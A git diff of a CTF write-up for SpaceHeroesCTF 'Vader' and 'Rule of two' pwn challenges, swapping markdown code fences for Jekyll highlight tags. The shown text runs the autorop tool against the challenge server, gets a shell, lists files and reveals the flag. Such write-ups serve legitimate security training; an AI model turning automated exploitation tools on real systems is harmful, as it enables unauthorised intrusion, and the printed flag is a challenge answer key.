@@ -22,7 +22,7 @@ If you see close, you note that both challenge has the same address, same port, 
 I will use an automated tool for CTF PWN resolution challenges called [AUTOROP](https://autorop.readthedocs.io/en/latest/)
 
 
-```bash
+{%- highlight bash -%}
 ┌──(leonuz㉿sniper)-[~[~/SpaceHeroesCTF/PWN/Vader]]
 └─$ autorop ./vader 0.cloud.chals.io 20712 
 [*] '/home/leonuz/CTFs/SpaceHeroesCTF/vader'
@@ -128,12 +128,12 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 
  When I left you, I was but the learner. Now I am the master >>> $ 
 
- ```
+ {%- endhighlight -%}
 
 At this point, we can see the prompt `$` which indicate that the machine has been pwn. Let's list the directory looking for the flags. 
 
 
-```bash
+{%- highlight bash -%}
  When I left you, I was but the learner. Now I am the master >>> $ ls
 -
 banner_fail
@@ -172,7 +172,7 @@ $
 [*] Closed connection to 0.cloud.chals.io port 20712
 [*] Closed connection to 0.cloud.chals.io port 20712
                                                                                                                                                                                             
-```
+{%- endhighlight -%}
 <center>flag for "Vader" Challenge is inside of flag.txt:</center>
 **<center>shctf{th3r3-1s-n0-try}</center>**
 <center>flag for "Rule of two" Challenge is inside of sith.txt: </center>
